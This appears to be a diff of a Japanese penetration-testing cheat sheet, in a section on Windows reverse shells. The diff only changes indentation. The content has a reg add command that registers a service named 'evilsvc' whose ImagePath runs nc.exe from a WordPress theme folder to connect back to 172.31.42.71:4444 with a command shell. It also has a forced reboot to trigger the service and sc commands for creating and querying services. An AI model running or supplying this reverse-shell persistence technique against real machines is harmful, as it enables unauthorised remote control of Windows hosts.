@@ -65,20 +65,20 @@
 * windows reverse shell
   * windowsサービス
 
-    ``` bat
-        #wordpressから[nc.exe]をfile uploadする必要がある。
-        reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe 172.31.42.71 4444 -e cmd\"" /f
+``` bat
+    #wordpressから[nc.exe]をfile uploadする必要がある。
+    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe 172.31.42.71 4444 -e cmd\"" /f
 
-        #再起動できる場合は再起動
-        shutdown /r /t 0
-    ```
+    #再起動できる場合は再起動
+    shutdown /r /t 0
+```
 
 * サービス登録
 
-  ``` batch
+``` batch
     # サービス登録コマンド
     # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
     sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
     # 
     sc qc evilsvc
-  ```
+```
